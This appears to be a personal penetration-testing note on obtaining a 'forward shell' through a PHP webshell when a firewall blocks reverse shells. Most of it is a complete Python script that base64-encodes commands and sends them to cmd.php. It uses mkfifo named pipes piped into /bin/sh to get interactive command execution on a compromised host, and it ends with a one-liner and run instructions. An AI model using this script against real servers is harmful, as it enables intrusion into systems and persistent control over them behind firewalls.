It is used when you detect a **firewall** and is imposible to strain any type of shell.
It use **named pipes** (Create a special file with unique name where many process can access and write or read information in them), this is using in the command [[Mkfifo]]

# Script python S4vitar

You can adapt this script in python to get the shell
https://raw.githubusercontent.com/s4vitar/ttyoverhttp/master/tty_over_http.py
```py
#!/usr/bin/python3

import requests, time, threading, pdb, signal, sys
from base64 import b64encode
from random import randrange

class AllTheReads(object):
        def __init__(self, interval=1):
                self.interval = interval
                thread = threading.Thread(target=self.run, args=())
                thread.daemon = True
                thread.start()

        def run(self):
                readoutput = """/bin/cat %s""" % (stdout)
                clearoutput = """echo '' > %s""" % (stdout)
                while True:
                        output = RunCmd(readoutput)
                        if output:
                                RunCmd(clearoutput)
                                print(output)
                        time.sleep(self.interval)

def RunCmd(cmd):
        cmd = cmd.encode('utf-8')
        cmd = b64encode(cmd).decode('utf-8')
        payload = {
                'cmd' : 'echo "%s" | base64 -d | sh' %(cmd)
                }
        result = (requests.get('http://127.0.0.1/cmd.php', params=payload, timeout=5).text).strip()
        return result

def WriteCmd(cmd):
        cmd = cmd.encode('utf-8')
        cmd = b64encode(cmd).decode('utf-8')
        payload = {
                'cmd' : 'echo "%s" | base64 -d > %s' % (cmd, stdin)
        }
        result = (requests.get('http://127.0.0.1/cmd.php', params=payload, timeout=5).text).strip()
        return result

def ReadCmd():
        GetOutput = """/bin/cat %s""" % (stdout)
        output = RunCmd(GetOutput)
        return output

def SetupShell():
        NamedPipes = """mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s""" % (stdin, stdin, stdout)
        try:
                RunCmd(NamedPipes)
        except:
                None
        return None

global stdin, stdout
session = randrange(1000, 9999)
stdin = "/dev/shm/input.%s" % (session)
stdout = "/dev/shm/output.%s" % (session)
erasestdin = """/bin/rm %s""" % (stdin)
erasestdout = """/bin/rm %s""" % (stdout)

SetupShell()

ReadingTheThings = AllTheReads()

def sig_handler(sig, frame):
        print("\n\n[*] Exiting...\n")
        print("[*] Removing files...\n")
        RunCmd(erasestdin)
        RunCmd(erasestdout)
        print("[*] All files have been deleted\n")
        sys.exit(0)

signal.signal(signal.SIGINT, sig_handler)

while True:
        cmd = input("> ")
        WriteCmd(cmd + "\n")
        time.sleep(1.1)
```

In the webshell (that is written in **php**) you **don't have to put pre-formatted labels** because the output will look bad.

You are playing with named pipes and [[Mkfifo]]

> mkfifo input; tail -f input | /bin/sh 2>&1 > output

To obtain the forward shell only you have to run the script

> python3 tty_over_http.py

This is not a tty, but you can [[Obtain tty - interactive console]]

-------

# Tags

#shell #forwardShell 

-----